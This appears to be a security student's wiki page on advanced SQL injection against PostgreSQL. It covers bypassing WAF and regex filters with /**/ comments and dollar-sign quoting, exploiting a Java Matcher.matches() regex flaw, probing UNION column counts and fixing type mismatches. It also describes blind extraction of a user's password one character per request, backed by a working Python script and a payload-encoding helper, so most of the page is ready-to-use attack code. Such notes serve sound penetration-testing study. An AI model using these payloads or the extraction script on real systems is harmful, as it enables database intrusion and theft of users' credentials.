---
tags: [attack/web, attack]
module: advanced_sql_injections
last_updated: 2026-05-22
source_count: 1
---

# Advanced SQLi — Character Bypasses

Techniques for injecting SQL payloads when a WAF or application-level filter restricts specific characters. Focused on PostgreSQL but most techniques apply to other RDBMS with minor syntax changes.

## Overview

Two types of filters commonly block injection:
- **Blacklist / WAF:** blocks specific strings (e.g., spaces, single quotes, `SELECT`, `UNION`)
- **Whitelist / regex:** only allows certain characters through

The goal is to express a valid SQL payload using only the allowed character set.

---

## Space Bypass — Multi-Line Comments (`/**/`)

Most SQL parsers treat `/**/` (an empty multi-line comment) as equivalent to whitespace. This is the primary bypass when spaces are blocked.

```sql
-- Original payload
' AND 1=1--

-- Space-free equivalent
'/**/AND/**/1=1--

-- UNION injection without spaces
'/**/union/**/select/**/$$1$$,$$2$$,$$3$$,$$4$$,$$5$$,$$6$$--
```

Other whitespace substitutes (database-dependent):

| Substitute | Notes |
|------------|-------|
| `/**/` | PostgreSQL, MySQL, MSSQL — universal |
| `%09` (tab), `%0a` (newline) | URL-encoded — useful in HTTP params |
| `()` | Some contexts: `UNION(SELECT(...))` |

---

## Single Quote Bypass — Dollar-Sign Quoting (`$$string$$`)

PostgreSQL supports **dollar-sign quoting** as an alternative string delimiter. Any string that would normally be written as `'value'` can be written as `$$value$$`.

This bypasses filters that block single quotes.

```sql
-- Original payload (single quotes blocked)
' UNION SELECT '1','2','3','4','5','6'--

-- Dollar-sign equivalent
'/**/union/**/select/**/$$1$$,$$2$$,$$3$$,$$4$$,$$5$$,$$6$$--
```

Named dollar tags also work and are harder for naive filters to detect:

```sql
-- Named tag form (also valid PostgreSQL)
$$value$$    →    $tag$value$tag$
```

---

## Java `Matcher.matches()` Trap

When the filter is implemented in Java using `Pattern.compile()` + `Matcher.matches()`, there is a common logic error to look for.

`Matcher.matches()` only returns `true` if the **entire input** matches the pattern — not a substring. `Matcher.find()` returns `true` if the pattern matches **anywhere** in the input.

```java
// Vulnerable filter — intends to block single quotes
Pattern p = Pattern.compile("'|(.*'.*'.*)");
Matcher m = p.matcher(u);
if (!m.matches()) { /* allow */ }
```

This pattern blocks:
- A bare `'` → matches `'`
- Any string containing two or more single quotes → matches `(.*'.*'.*)`

But it **does not block a payload containing exactly one single quote** — `a'--` returns `false` from `matches()` because the pattern requires either a bare quote or two quotes.

```bash
# Test payloads against the regex
python3 -c "import re; p = re.compile(r\"'|(.*'.*'.*)\"); tests = [\"a'\", \"a'--\", \"a'b'c\"]; [print(t, bool(p.fullmatch(t))) for t in tests]"
# a'     True  — blocked
# a'--   False — passes! injection point
# a'b'c  True  — blocked
```

---

## UNION Column Count Discovery

Without spaces, use `/**/` to probe column count:

```bash
# Start at 1 column, increment until no error
'/**/union/**/select/**/$$1$$--
'/**/union/**/select/**/$$1$$,$$2$$--
'/**/union/**/select/**/$$1$$,$$2$$,$$3$$--
# ... continue until response changes
```

Check PostgreSQL logs (if accessible) to read the exact error:
```
ERROR: each UNION query must have the same number of columns at character 67
```

---

## Type Mismatch in UNION

When UNION succeeds on column count but fails with a type error:

```
ERROR: UNION types character varying and integer cannot be matched
```

Cast integer columns to VARCHAR or use string literals for VARCHAR columns:

```sql
-- Mix string/int types to match the original query's column types
'/**/union/**/select/**/$$1$$,$$2$$,$$3$$,$$4$$,5--
--                        ^^^text cols^^^         ^int col
```

Deduce types from the query structure (if source is available) or systematically try each column position.

---

## Comparative Precomputation — Blind SQLi (1 Char/Request)

Standard blind SQLi bisection requires ~7 requests per character. Comparative precomputation can extract **1 character per request** when the response reflects a numeric ID.

**Concept:** inject a comparison that makes the query return the row whose `id` equals the ASCII value of the target character.

```sql
-- If the response shows user #36, ASCII 36 = '$'
'/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,1,1))/**/FROM/**/users/**/WHERE/**/username=$$targetuser$$)--
```

Position `N` of the string:
```sql
'/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,N,1))/**/FROM/**/users/**/WHERE/**/username=$$targetuser$$)--
```

**Automation sketch:**

```python
import requests
import string

TARGET = "http://target:8080/find-user?u="

def get_char(pos):
    payload = f"'/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,{pos},1))/**/FROM/**/users/**/WHERE/**/username=$$itsmaria$$)--"
    r = requests.get(TARGET + payload)
    # Parse the reflected user ID from the response HTML
    import re
    m = re.search(r'user-id["\s]+>(\d+)', r.text)
    if m:
        return chr(int(m.group(1)))
    return None

result = ""
for i in range(1, 65):  # adjust max length
    c = get_char(i)
    if not c:
        break
    result += c
    print(f"[{i}] {c}  →  {result}")
```

---

## Payload Encoding Helper

```python
import urllib.parse

def encode_payload(payload):
    """Replace spaces with /**/ and single quotes with $$...$$ pairs."""
    # Replace spaces
    payload = payload.replace(' ', '/**/')
    # Replace quoted strings: 'value' → $$value$$
    import re
    payload = re.sub(r"'([^']*)'", r'$$\1$$', payload)
    return payload

tests = [
    "' UNION SELECT '1','2','3','4','5','6'--",
    "' AND 1=1--",
    "' AND id=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='target')--"
]
for t in tests:
    print(f"Original: {t}")
    print(f"Encoded:  {encode_payload(t)}")
    print()
```

---

## Gotchas & Notes

- `$$` quoting does not work inside single-quoted strings — only at the top-level SQL context. If you're already inside a string, you cannot use `$$` to escape.
- PostgreSQL `/**/` comment spaces work inside keywords: `UN/**/ION` can bypass keyword-level filters.
- When a filter uses `toLowerCase()` before matching, `UNION` becomes `union` — use lowercase in payloads.
- Comparative precomputation only works when the query returns a row with a numeric identifier that you can read from the response.

## Related Pages

- [[attack/web/white_box_sqli_methodology]] — how to find injection points in Java source
- [[attack/web/error_based_sqli]] — leaking data via CAST errors
- [[attack/web/second_order_sqli]] — stored injection via user-controlled DB fields
- [[attack/web/postgresql_file_read_write]] — next step after gaining injection
- [[tools/utility/psql]] — testing payloads directly against the database

## Sources

- raw/advanced_sql_injections/advanced_sql_injection_techniques_common_character_bypasses.md
